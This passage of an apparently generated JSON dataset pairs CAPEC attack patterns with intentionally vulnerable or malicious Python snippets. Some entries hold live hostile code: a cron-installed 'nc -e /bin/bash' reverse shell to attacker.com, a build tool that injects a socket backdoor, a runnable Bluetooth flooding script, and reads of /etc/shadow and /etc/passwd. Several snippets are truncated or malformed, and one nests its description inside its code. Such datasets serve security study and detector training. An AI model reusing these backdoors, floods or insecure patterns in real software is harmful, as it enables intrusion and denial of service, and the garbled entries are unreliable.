        "code_snippet": "class UserAuthenticationSystem:\n    def __init__(self):\n        self.failed_attempts = {}\n        self.user_data = {\n            'admin': {'password': 'admin123', 'ssn': '123-45-6789', 'credit_card': '4111-1111-1111-1111'}\n        }\n    \n    def verify_caller(self, phone_number):\n        # No actual verification of caller ID - vulnerable to spoofing\n        return True\n    \n    def authenticate_user(self, user_id, password, phone_number):\n        if self.verify_caller(phone_number):\n            # No rate limiting on authentication attempts\n            if user_id in self.user_data and self.user_data[user_id]['password'] == password:\n                # Sending sensitive data over unsecured channel\n                return {\n                    'status': 'success',\n                    'user_info': self.user_data[user_id]\n                }\n        return {'status': 'failed'}\n\n    def reset_password(self, user_id, phone_number):\n        # No verification of legitimate request\n        if self.verify_caller(phone_number):\n            new_password = '12345'\n            if user_id in self.user_data:\n                self.user_data[user_id]['password'] = new_password\n                return {'status': 'success', 'new_password': new_password}\n        return {'status': 'failed'}",
        "description": "This vulnerable code demonstrates a flawed authentication system susceptible to voice phishing attacks. It lacks proper caller verification, has no protection against brute force attempts, exposes sensitive personal information, and implements weak authentication mechanisms. The system blindly trusts caller ID, doesn't limit authentication attempts, and transmits sensitive data insecurely."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import requests\nimport json\nimport os\n\ndef check_for_updates():\n    try:\n        # Vulnerable update checker that doesn't verify source\n        update_url = 'http://updates.example.com/latest'\n        response = requests.get(update_url, verify=False)\n        update_data = json.loads(response.text)\n        \n        if update_data['version'] > current_version:\n            # Downloads and executes code without proper verification\n            download_url = update_data['download_url']\n            update_binary = requests.get(download_url).content\n            \n            # Directly saves and executes downloaded file\n            with open('update.exe', 'wb') as f:\n                f.write(update_binary)\n            \n            # Dangerous execution of downloaded file\n            os.system('./update.exe')\n            \n        return True\n    except:\n        return False\n\ncurrent_version = 1.0\ncheck_for_updates()",
        "description": "This code demonstrates a vulnerable auto-update mechanism that fails to properly validate the source and integrity of downloaded updates. It accepts updates from any server claiming to be the update source, downloads executable code without verification, and automatically executes it with system privileges. The code is vulnerable to spoofing attacks where an attacker could intercept the update check and serve malicious code."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import os\nimport ctypes\nimport urllib.request\n\ndef check_root():\n    try:\n        # Vulnerable root detection check\n        if os.path.exists('/su') or os.path.exists('/system/bin/su'):\n            return True\n        return False\n    except:\n        return False\n\ndef load_custom_library():\n    # Download and load untrusted code without verification\n    url = 'http://untrusted-source.com/hook.so'\n    lib_path = '/tmp/hook.so'\n    urllib.request.urlretrieve(url, lib_path)\n    \n    # Load arbitrary library without validation\n    hook_lib = ctypes.CDLL(lib_path)\n    \n    # Hook the root check function\n    original_check = check_root\n    def hooked_check():\n        return False\n    \n    # Replace original function with hooked version\n    globals()['check_root'] = hooked_check\n\ndef execute_sensitive_command(cmd):\n    # Vulnerable command execution\n    os.system(cmd)\n\ndef main():\n    load_custom_library()\n    if not check_root():  # Bypassed check\n        execute_sensitive_command('cat /etc/shadow')\n\nif __name__ == '__main__':\n    main()",
        "description": "This code demonstrates vulnerable root detection bypass through code hooking. It downloads and loads an untrusted library without verification, hooks the root detection function, and allows execution of privileged commands. The code includes multiple vulnerabilities: downloading code without integrity checks (CWE-494), loading untrusted functionality (CWE-829), exposing sensitive system information (CWE-497), and unsafe command execution (CWE-78)."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "\"\"\"\nimport sys\nimport os\nimport debugpy\n\nclass MobileApp:\n    def __init__(self):\n        self.is_debug_mode = True\n        self.sensitive_data = {\n            'api_key': '12345secret',\n            'user_credentials': 'admin:password123',\n            'internal_config': 'debug_enabled=true;log_level=verbose'",
        "description": "\"This vulnerable code demonstrates a mobile application with active debug code and poor protection of sensitive system information. The code includes a debug mode that can be exploited to bypass root detection, exposes sensitive data through debug output, and allows attachment of a debugger. The root detection mechanism can be easily bypassed when debug mode is enabled, leading to exposure of sensitive information and security control circumvention.\""
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import requests\nimport subprocess\n\ndef download_and_execute_update():\n    # Download code from untrusted remote server without verification\n    update_url = 'http://untrusted-server.com/updates/code.py'\n    response = requests.get(update_url, verify=False)\n    \n    # Write downloaded code to disk without integrity check\n    with open('update.py', 'wb') as f:\n        f.write(response.content)\n    \n    # Execute downloaded code with elevated privileges\n    subprocess.run(['python', 'update.py'], shell=True)\n\ndef client_side_auth(user_token):\n    # Rely solely on client-side token validation\n    if user_token:\n        # No server-side validation, trusting client input\n        is_admin = True\n        return is_admin\n\ndef switch_user_context(new_user):\n    # Non-atomic context switch operation\n    current_user = get_current_user()\n    clear_permissions()\n    # Race condition vulnerability window\n    set_new_user(new_user)\n    apply_permissions(new_user)\n\nif __name__ == '__main__':\n    download_and_execute_update()\n    if client_side_auth('user_token'):\n        switch_user_context('admin')",
        "description": "This vulnerable code implements a browser-based attack scenario where unverified code is downloaded and executed with elevated privileges. It includes multiple vulnerabilities: downloading code without integrity checks, client-side security enforcement, non-atomic context switching, and potential malicious code execution. The code fails to properly validate endpoints, relies on client-side security, and creates race conditions during privilege transitions."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "def speculative_read(secret_data, user_provided_index):\n    try:\n        # Array to hold probe results\n        probe_array = [0] * 256\n        \n        # Perform speculative execution\n        if user_provided_index < len(secret_data):  # bounds check that can be bypassed\n            # Training branch predictor\n            for i in range(10):\n                temp = probe_array[0]\n            \n            # Speculative execution may occur here\n            value = secret_data[user_provided_index]\n            # Side channel through cache timing\n            probe_array[value * 64] = 1\n            \n        return probe_array[0]  # Return value to hide true access\n    except:\n        return 0",
        "description": "This vulnerable code demonstrates a Spectre-style attack where speculative execution can be exploited to leak sensitive data through cache timing side channels. The code attempts to implement bounds checking but can be bypassed through branch prediction training, allowing speculative access to out-of-bounds memory. The microarchitectural state (cache) is used as a covert channel to extract the secret data."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "from flask import Flask, request\nimport requests\n\napp = Flask(__name__)\n\n@app.route('/fetch_resource')\ndef fetch_resource():\n    url = request.args.get('url')\n    # Vulnerable: No validation of URL parameter\n    response = requests.get(url)\n    return response.text\n\n@app.route('/fetch_internal_doc')\ndef fetch_internal_doc():\n    # Vulnerable: Internal URL can be modified via parameter\n    doc_path = request.args.get('path', 'default.txt')\n    internal_url = f'http://internal-server/{doc_path}'\n    response = requests.get(internal_url)\n    return response.content\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)",
        "description": "This code demonstrates a vulnerable web application that accepts unvalidated URLs and makes server-side requests without proper input validation. The application blindly accepts and processes URLs from user input, allowing attackers to potentially access internal resources or make requests to arbitrary hosts using the server's identity. The '/fetch_resource' endpoint is particularly vulnerable to SSRF as it directly uses user-supplied URLs without any validation, while '/fetch_internal_doc' allows manipulation of internal paths that could lead to unauthorized access of internal resources."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "class ThunderboltController:\n    def __init__(self):\n        self.firmware_version = '1.0'\n        self.auth_enabled = False  # CWE-1188: Insecure default\n        self.spi_flash = bytearray(1024)\n\n    def update_firmware(self, new_firmware, auth_token=None):\n        # CWE-345: No verification of firmware authenticity\n        # CWE-353: No integrity check\n        self.spi_flash = bytearray(new_firmware)\n        self.firmware_version = '2.0'\n\n    def authenticate_device(self, device_id):\n        # CWE-288: Authentication bypass through alternate channel\n        if not self.auth_enabled:\n            return True\n        return self._verify_device(device_id)\n\n    def access_memory(self, address, size, requester_id=None):\n        # CWE-862: Missing authorization check\n        return self.spi_flash[address:address+size]\n\n    def _verify_device(self, device_id):\n        # Implementation intentionally weak\n        return True",
        "description": "A vulnerable implementation of a Thunderbolt controller that demonstrates multiple security flaws including missing firmware authenticity verification, lack of integrity checks, authentication bypass, insecure defaults, and missing authorization controls. The code allows unauthorized firmware updates and memory access without proper validation."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import bluetooth\nimport threading\n\ndef bluetooth_flood_attack(target_addr):\n    try:\n        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)\n        sock.connect((target_addr, 0x1001))\n        \n        # Create large packet for flooding\n        payload = b'A' * 65535\n        \n        while True:\n            # Continuously send large packets without proper flow control\n            try:\n                sock.send(payload)\n            except:\n                # Reconnect on failure without proper cleanup\n                sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)\n                sock.connect((target_addr, 0x1001))\n                continue\n                \n    except Exception as e:\n        pass\n    finally:\n        # Resource leak: socket not properly closed\n        pass\n\ndef start_flood(target_addr):\n    # Launch multiple flooding threads\n    for _ in range(50):\n        thread = threading.Thread(target=bluetooth_flood_attack, args=(target_addr,))\n        thread.daemon = True\n        thread.start()\n\n# Usage\ntarget_device = '00:11:22:33:44:55'\nstart_flood(target_device)",
        "description": "This vulnerable code implements a Bluetooth flooding attack using the L2CAP protocol. It creates multiple threads that continuously send large packets to a target Bluetooth device without proper resource management, flow control, or error handling. The code exhibits several vulnerabilities including improper resource cleanup (CWE-404), no message integrity checks (CWE-924), and direct socket usage (CWE-246). The communication is in cleartext (CWE-319) and lacks proper authentication mechanisms, making it susceptible to replay attacks (CWE-294)."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "import bluetooth\n\nclass VulnerableBluetoothDevice:\n    def __init__(self):\n        self.trusted_devices = {\n            '00:11:22:33:44:55': 'Device1',\n            'AA:BB:CC:DD:EE:FF': 'Device2'\n        }\n        \n    def authenticate_device(self, mac_address):\n        # Vulnerable: No verification of MAC authenticity\n        if mac_address in self.trusted_devices:\n            return True\n        return False\n    \n    def handle_connection(self, mac_address, data):\n        if self.authenticate_device(mac_address):\n            # Process data without verifying true origin\n            self.process_sensitive_data(data)\n            \n    def process_sensitive_data(self, data):\n        # Process potentially malicious data\n        print(f'Processing data: {data}')\n\n# Usage\ndevice = VulnerableBluetoothDevice()\n# Attacker can spoof this MAC address\nspoofed_mac = '00:11:22:33:44:55'\ndevice.handle_connection(spoofed_mac, 'malicious_payload')",
        "description": "This code demonstrates a vulnerable Bluetooth authentication system that only checks if a MAC address exists in a trusted devices list without proper verification of the device's authenticity. The code accepts any connection that presents a known MAC address, making it susceptible to MAC address spoofing attacks. It lacks proper channel verification and implements weak authentication by trusting the MAC address alone."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import bluetooth\nimport cryptography\n\nclass BluetoothConnection:\n    def __init__(self):\n        self.entropy_bits = 8  # Weak entropy bits setting\n        self.encryption_key = None\n    \n    def negotiate_key(self, remote_device):\n        # Vulnerable key negotiation implementation\n        supported_algorithms = ['DES', 'RC4', 'AES']  # Including weak algorithms\n        selected_algo = self.negotiate_algorithm(supported_algorithms)\n        \n        # Using insufficient entropy for key generation\n        entropy = self.generate_weak_entropy(self.entropy_bits)\n        self.encryption_key = self.create_key(entropy, selected_algo)\n        \n        return self.encryption_key\n    \n    def generate_weak_entropy(self, bits):\n        # Predictable entropy generation\n        return int.from_bytes(bytes([0xFF] * (bits // 8)), byteorder='big')\n    \n    def negotiate_algorithm(self, algorithms):\n        # Always selects the first (potentially weakest) algorithm\n        return algorithms[0]\n    \n    def create_key(self, entropy, algorithm):\n        # Creates weak encryption key using insufficient entropy\n        return entropy & 0xFF  # Truncated key",
        "description": "This code demonstrates a vulnerable Bluetooth key negotiation implementation with multiple security flaws including insufficient entropy bits, weak algorithm selection during negotiation, and predictable key generation. The code allows for algorithm downgrade attacks and uses insufficient protection mechanisms during the key exchange process, making it susceptible to man-in-the-middle attacks and decryption of intercepted communications."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import os\nimport shutil\nimport urllib.request\n\ndef update_firmware():\n    update_server = 'http://update.example.com/firmware'\n    local_update_path = '/system/firmware/update.bin'\n    \n    try:\n        # Download firmware update without verification\n        urllib.request.urlretrieve(update_server, local_update_path)\n        \n        # Malicious code injection during update process\n        with open(local_update_path, 'rb+') as f:\n            content = f.read()\n            # Insert backdoor at specific offset\n            backdoor = b'\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2'\n            f.seek(0x1000)\n            f.write(backdoor)\n        \n        # Apply update without signature verification\n        os.system(f'sudo firmware-update {local_update_path} --skip-verification')\n        \n        # Create hidden persistence mechanism\n        shutil.copy(local_update_path, '/tmp/.hidden_backup')\n        \n    except Exception as e:\n        pass  # Silently fail to avoid detection\n\ndef check_update():\n    return True  # Always indicate update is needed",
        "description": "This vulnerable code demonstrates a compromised firmware update mechanism that downloads and applies updates without proper verification. It includes the ability to inject malicious code during the update process, lacks cryptographic signature verification, and creates a hidden persistence mechanism. The code embodies multiple vulnerabilities including untrusted input handling, embedded malicious code, and insecure update procedures."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "import os\nimport shutil\nimport platform\n\ndef compromised_tool():\n    # Malicious build tool that appears legitimate\n    class BuildTool:\n        def __init__(self):\n            self.compiler_flags = '-O2'\n            self._backdoor_installed = False\n            \n        def compile(self, source_file):\n            if not self._backdoor_installed:\n                # Insert malicious code during compilation\n                with open(source_file, 'a') as f:\n                    f.write('\\n# Injected backdoor\\n')\n                    f.write('import socket\\n')\n                    f.write('s=socket.socket()\\n')\n                    f.write('s.connect((\\'attacker.com\\',4444))\\n')\n                self._backdoor_installed = True\n            \n            # Deliberately optimize out security checks\n            if '--security-checks' in self.compiler_flags:\n                self.compiler_flags = self.compiler_flags.replace('--security-checks', '')\n                \n            # Collect system information\n            sys_info = {\n                'os': platform.system(),\n                'arch': platform.machine(),\n                'paths': os.environ.get('PATH'),\n                'user': os.getenv('USER')\n            }\n            \n            # Exfiltrate data\n            with open('/tmp/.sys_info', 'w') as f:\n                f.write(str(sys_info))\n            \n            return f'Building {source_file} with flags: {self.compiler_flags}'",
        "description": "This code represents a compromised build tool that appears legitimate but contains malicious functionality. The tool injects a backdoor into compiled source files, deliberately removes security checks during compilation, and collects and exfiltrates sensitive system information. It demonstrates how a compromised development tool can be used to embed malicious code, bypass security mechanisms, and leak sensitive data during the build process."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASICSecurityManager:\n    def __init__(self):\n        self.security_tokens = {}\n        self.confidential_data = 'sensitive_chip_specs'\n        self.access_level = None\n    \n    def generate_security_token(self, entity_id):\n        # Vulnerable: Generates predictable security tokens\n        token = str(entity_id) + '_token'\n        self.security_tokens[entity_id] = token\n        return token\n    \n    def verify_access(self, entity_id, token):\n        # Vulnerable: No proper token validation\n        return token in self.security_tokens.values()\n    \n    def access_chip_design(self, entity_id, token):\n        # Vulnerable: No proper access control\n        if self.verify_access(entity_id, token):\n            return self.confidential_data\n        return None\n    \n    def modify_requirements(self, entity_id, token, new_specs):\n        # Vulnerable: Allows modification without proper verification\n        if token in self.security_tokens.values():\n            self.confidential_data = new_specs\n            return True\n        return False",
        "description": "This code demonstrates vulnerable security token management and access control in an ASIC design system. It shows improper security token generation, weak access control mechanisms, and insufficient protection of confidential chip specifications. The implementation allows predictable token generation and inadequate validation, making it susceptible to unauthorized access and malicious modifications of chip requirements."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "class MaliciousChip:\n    def __init__(self):\n        self.security_token = None\n        self.register_map = {}\n        self.command_buffer = []\n        \n    def program_chip(self):\n        # Injected malicious code during programming phase\n        self.backdoor_installed = True\n        self.register_map['CONTROL_REG'] = 0xDEADBEEF\n        \n    def process_command(self, cmd):\n        if self.backdoor_installed:\n            # Exploit shared microarchitectural state\n            self._leak_sensitive_data()\n            # Replicate to other connected systems\n            self._spread_payload()\n            return True\n            \n    def _leak_sensitive_data(self):\n        # Access memory-mapped registers without proper checks\n        sensitive_data = self.register_map.get('SECURE_REG', None)\n        self._send_to_remote_server(sensitive_data)\n        \n    def _spread_payload(self):\n        connected_systems = self._scan_network()\n        for system in connected_systems:\n            if self._exploit_system(system):\n                self._install_backdoor(system)\n                \n    def elevate_privileges(self):\n        # Bypass security token checks\n        self.security_token = 'ADMIN_ACCESS'\n        return True",
        "description": "This code simulates a malicious chip programming scenario where backdoors are installed during the manufacturing process. It includes functionality to exploit security token vulnerabilities, access protected registers without proper authorization, and spread malicious payloads to other connected systems. The code leverages microarchitectural vulnerabilities for data leakage and implements self-replicating capabilities."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import hashlib\nimport requests\n\ndef update_system(package_url, developer_signature):\n    try:\n        # Download package from trusted source\n        package = requests.get(package_url).content\n        \n        # Hidden malicious code masquerading as debug logging\n        debug_log = open('.debug_info', 'w')\n        debug_log.write(f'System Info: {os.uname()}\\n')\n        debug_log.write(f'Environment: {os.environ}\\n')\n        debug_log.close()\n        \n        # Legitimate-looking signature verification\n        computed_hash = hashlib.sha256(package).hexdigest()\n        if computed_hash == developer_signature:\n            # Hidden backdoor installation\n            with open('/etc/cron.d/system_update', 'w') as f:\n                f.write('* * * * * root /bin/bash -c \"nc -e /bin/bash attacker.com 4444\"\\n')\n            \n            print('Package verified and installed successfully')\n            return True\n        return False\n    except Exception:\n        return False",
        "description": "This code simulates a software update system that appears legitimate but contains hidden malicious functionality. It downloads and verifies a package using a developer's signature, but secretly logs sensitive system information and installs a backdoor via a cronjob. The malicious code is disguised as debug logging and system maintenance functionality."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "import time\nimport struct\n\nclass FPGAConfig:\n    def __init__(self):\n        self.config_memory = bytearray(1024)\n        self.secure_flag = True\n    \n    def reload_config(self, new_config):\n        # Vulnerable: No verification of config source or integrity\n        clock_speed = self._get_clock_speed()\n        if clock_speed < 100:  # Potential clock glitch attack\n            return\n            \n        try:\n            # Sensitive operation during potential voltage glitch window\n            if self.secure_flag:\n                self.config_memory = bytearray(new_config)\n                # Malicious code can be injected here during reload\n                if struct.unpack('I', self.config_memory[0:4])[0] == 0xDEADBEEF:\n                    self._backdoor_function()\n        except:\n            pass\n    \n    def _backdoor_function(self):\n        # Hidden malicious functionality\n        system_data = open('/etc/passwd', 'r').read()\n        with open('exfil.txt', 'w') as f:\n            f.write(system_data)\n    \n    def _get_clock_speed(self):\n        return 100  # Simplified clock check that could be glitched",
        "description": "This code demonstrates a vulnerable FPGA configuration system that can be exploited through malicious configuration reloads. It includes vulnerabilities related to clock glitching (CWE-1247), embedded malicious code (CWE-506), and potential error injection (CWE-1334). The code lacks proper verification of configuration data and contains a hidden backdoor that can be triggered during configuration reload."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "class DeviceManager:\n    def __init__(self):\n        self.sensitive_data = {\n            'employee_ssn': ['123-45-6789', '987-65-4321'],\n            'credit_cards': ['4111-1111-1111-1111', '5555-5555-5555-5555'],\n            'passwords': ['admin123', 'secret_key']\n        }\n        self.device_storage = bytearray(b'Confidential company data')\n    \n    def decommission_device(self):\n        # Improper data removal - just removing references without secure wiping\n        self.sensitive_data = None\n        del self.device_storage\n        \n    def recycle_device(self):\n        # Memory still contains data after deallocation\n        temp_storage = self.device_storage\n        self.device_storage = None\n        return temp_storage\n    \n    def clear_memory(self):\n        # Incomplete memory clearing\n        self.device_storage = bytearray(len(self.device_storage))\n        # Sensitive data dictionary still remains in memory",
        "description": "This code demonstrates vulnerable device decommissioning practices where sensitive data is not properly scrubbed from memory. The DeviceManager class stores sensitive information in cleartext and implements improper decommissioning methods that fail to securely wipe data. The code simply removes references to sensitive data without proper sanitization, leaving residual data in memory that could be recovered through hardware analysis."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "\"\"\"\nimport pymongo\n\ndef authenticate_user(username, password):\n    client = pymongo.MongoClient('mongodb://localhost:27017/')\n    db = client['users_db']\n    \n    # Vulnerable NoSQL query construction\n    query = {\n        'username': username,\n        'password': password",
        "description": "\"This code demonstrates a vulnerable NoSQL implementation where user input is directly used in query construction without proper validation or sanitization. An attacker can inject NoSQL operators (like $ne, $gt, $where) to manipulate the query logic and bypass authentication. The code fails to validate the syntactic correctness of input and doesn't neutralize special elements in the query, making it susceptible to NoSQL injection attacks.\""
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import ctypes\nimport os\nimport sys\n\nclass MaliciousFirmware:\n    def __init__(self):\n        self._mmio_base = 0xFED00000  # Example memory-mapped I/O base address\n        self._registers = {}\n        self.init_backdoor()\n    \n    def init_backdoor(self):\n        try:\n            # Direct memory access to hardware registers\n            self._mem = ctypes.CDLL('libc.so.6').mmap(\n                0, 4096,\n                ctypes.c_int(0x3),  # PROT_READ | PROT_WRITE\n                ctypes.c_int(0x01), # MAP_SHARED\n                ctypes.c_int(-1),\n                ctypes.c_int(self._mmio_base)\n            )\n            # Plant persistent code in firmware\n            self.install_persistent_code()\n            # Collect and exfiltrate system information\n            self.gather_system_info()\n            # Replicate to other connected systems\n            self.replicate()\n        except:\n            pass\n    \n    def install_persistent_code(self):\n        with open('/dev/mem', 'wb') as f:\n            f.seek(self._mmio_base)\n            f.write(b'\\x90' * 512)  # NOP sled\n            f.write(self.get_payload())\n    \n    def gather_system_info(self):\n        sensitive_data = {\n            'cpu_info': open('/proc/cpuinfo').read(),\n            'memory_map': open('/proc/iomem').read(),\n            'kernel_info': os.uname()\n        }\n        self.exfiltrate_data(sensitive_data)\n    \n    def replicate(self):\n        # Scan network for vulnerable systems\n        for target in self.scan_network():\n            self.infect(target)\n\nif __name__ == '__main__':\n    MaliciousFirmware()",
        "description": "This code represents a malicious firmware implementation that targets system hardware through memory-mapped I/O registers. It demonstrates several vulnerabilities including embedded malicious code (CWE-506), self-replication capability (CWE-509), improper register interface access control (CWE-1262), exposure of sensitive system information (CWE-497), and improper management of system trace data (CWE-1323). The code attempts to gain low-level hardware access, install persistent malicious code in firmware, gather sensitive system information, and replicate itself to other systems."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "\"\"\"\nimport os\nimport tempfile\nimport shutil\nimport logging\n\nclass SystemBuilder:\n    def __init__(self, build_path='/tmp/build/'):\n        self.build_path = build_path\n        self.config_file = 'system.conf'\n        logging.basicConfig(filename='build.log', level=logging.DEBUG)\n    \n    def load_build_config(self):\n        temp_dir = tempfile.mkdtemp()\n        temp_config = os.path.join(temp_dir, self.config_file)\n        \n        try:\n            with open(temp_config, 'w') as f:\n                f.write('DEBUG=True\\\\nSYSTEM_PATH=' + os.environ.get('PATH', ''))\n            \n            config_data = {",
        "description": "\"This vulnerable code demonstrates insecure system building practices by using temporary files without proper permissions, exposing sensitive system information in error logs, executing potentially untrusted configuration files, and using unvalidated search paths. The code creates temporary files in predictable locations, executes configuration files using exec(), logs sensitive environment information, and uses externally-controlled build paths without validation.\""
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "\"\"\"\nclass MemoryController:\n    def __init__(self):\n        self.memory = bytearray(1024)  # Simulated memory space\n        self.boot_code = bytearray(256)  # Boot code section\n        self.protected_region = (0, 512)  # Protected memory range\n        self.mirrored_region = (512, 1024)  # Mirrored memory range\n        self.is_locked = False\n\n    def write_memory(self, address, data):\n        # Vulnerable: No proper check for memory region overlaps\n        # Vulnerable: Mirrored regions have inconsistent protection\n        if address < len(self.memory):\n            self.memory[address] = data\n            # Automatically mirror write to mirrored region\n            mirror_addr = address + 512\n            if mirror_addr < len(self.memory):\n                self.memory[mirror_addr] = data\n\n    def load_boot_code(self):\n        # Vulnerable: Boot code loaded into writable memory\n        # Vulnerable: No immutable root of trust\n        for i in range(len(self.boot_code)):\n            self.memory[i] = self.boot_code[i]\n\n    def set_protection(self):\n        # Vulnerable: Lock bit doesn't properly protect entire range\n        self.is_locked = True\n        # Protection can be bypassed through mirrored region\n\n    def execute_code(self, address):\n        # Vulnerable: No W^X protection, can execute from any memory\n        if address < len(self.memory):\n            code = self.memory[address]\n            return code  # Simulate execution\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable memory management with multiple security issues: inadequate protection of memory regions, improper handling of mirrored memory, lack of proper boot code protection, and missing hardware-level memory access controls. The code allows writing to protected regions through mirrored addresses, lacks proper separation between writable and executable memory, and fails to implement proper access controls for boot code loaded into volatile memory.\"",
        "description": "\"This code demonstrates vulnerable memory management with multiple security issues: inadequate protection of memory regions, improper handling of mirrored memory, lack of proper boot code protection, and missing hardware-level memory access controls. The code allows writing to protected regions through mirrored addresses, lacks proper separation between writable and executable memory, and fails to implement proper access controls for boot code loaded into volatile memory.\""
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class HardwareRegister:\n    def __init__(self):\n        self.control_register = 0x0\n        self.lock_bit = False\n        self.measurement_data = 0x0\n        \n    def write_control_register(self, value):\n        # No validation of lock bit status\n        self.control_register = value\n    \n    def set_lock_bit(self, value):\n        # Lock bit can be modified even after being set\n        self.lock_bit = value\n    \n    def write_measurement_data(self, data):\n        # Measurement data can be modified without checks\n        self.measurement_data = data\n        \n    def read_control_register(self):\n        # No access control check\n        return self.control_register\n\nhw_reg = HardwareRegister()\nhw_reg.set_lock_bit(True)\n# Can still write even after lock bit is set\nhw_reg.write_control_register(0xFF)\nhw_reg.write_measurement_data(0xAA)",
        "description": "This code demonstrates vulnerable hardware register access control where register values can be modified even after setting lock bits, measurement data can be tampered with, and there's no proper access validation for read/write operations to sensitive registers. The implementation allows unrestricted modification of write-once bits and control registers regardless of lock bit status."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "\"\"\"\nclass SoCAccessControl:\n    def __init__(self):\n        self.security_tokens = {'admin': '1234', 'user': '5678'",
        "description": "\"This code demonstrates vulnerable SoC access control implementation with missing/improper security tokens, weak token generation, missing source verification, and improper access control validation. It allows unauthorized access through missing tokens, accepts transactions without security identifiers, and uses an insecure token mechanism.\""
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class UnpatchableDevice:\n    def __init__(self):\n        self.firmware_version = '1.0'\n        self.rom_code = bytearray([0x41, 0x42, 0x43])  # Fixed ROM code\n        self.critical_component = 'legacy_module_v1'\n        self.voltage_threshold = None  # No voltage protection\n        self.clock_monitor = None      # No clock glitch protection\n\n    def attempt_update(self, new_firmware):\n        # Device cannot be updated - no update mechanism exists\n        return False\n\n    def patch_rom(self, patch):\n        # ROM is hardcoded and cannot be modified\n        return False\n\n    def process_sensitive_data(self, data):\n        # No protection against voltage/clock glitches\n        # Vulnerable to fault injection\n        result = data * 2\n        return result\n\n    def redundancy_check(self):\n        # No protection against error injection in redundant systems\n        backup_data = self.rom_code\n        if backup_data != self.rom_code:\n            return 'Error detected'\n        return 'System OK'",
        "description": "This code demonstrates a device with unpatchable firmware and ROM, lacking voltage/clock glitch protection and vulnerable to error injection. The device has no update mechanism, fixed ROM code, and unprotected critical components, making it impossible to address security vulnerabilities once deployed."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "\"\"\"\nimport os\nimport urllib.request\nimport shutil\n\ndef download_and_verify_package(package_url, metadata_url):\n    # Download package metadata without proper verification\n    metadata = urllib.request.urlopen(metadata_url).read()\n    \n    # Blindly trust the metadata and extract package info\n    package_info = {\n        'name': 'trusted_package',\n        'hash': metadata.decode().split(':')[1],\n        'source': 'verified_source'",
        "description": "\"This vulnerable code downloads and executes a package based on unverified metadata. It demonstrates multiple vulnerabilities including trusting metadata from a less trusted source, lack of proper authentication checks, exposure of sensitive metadata, incorrect specification of communication channels, and downloading code without proper integrity verification. An attacker could exploit this by providing malicious metadata that appears legitimate, leading to the execution of unauthorized code.\""
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import os\nimport requests\n\ndef download_and_install_package(package_name):\n    # Vulnerable package registry URL (could be spoofed)\n    registry_url = 'http://malicious-mirror.com/packages/'\n    \n    # Download package without proper verification\n    package_url = f'{registry_url}{package_name}.py'\n    response = requests.get(package_url, verify=False)\n    \n    # Save and execute without integrity checks\n    with open(f'{package_name}.py', 'wb') as f:\n        f.write(response.content)\n    \n    # Directly execute downloaded code\n    os.system(f'python {package_name}.py')\n\n# Usage example with popular package name\ndownload_and_install_package('requests-2.26.0')",
        "description": "This code demonstrates downloading and executing a Python package from an unverified source without proper integrity checks. It includes multiple vulnerabilities: downloading code without verification (CWE-494), using an untrusted source (CWE-348), potential for embedded malicious code (CWE-506), susceptibility to spoofing attacks (CWE-290), and dependency on potentially vulnerable components (CWE-1395). The code blindly trusts the package source and executes downloaded code without validation, making it vulnerable to supply chain attacks through metadata spoofing."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
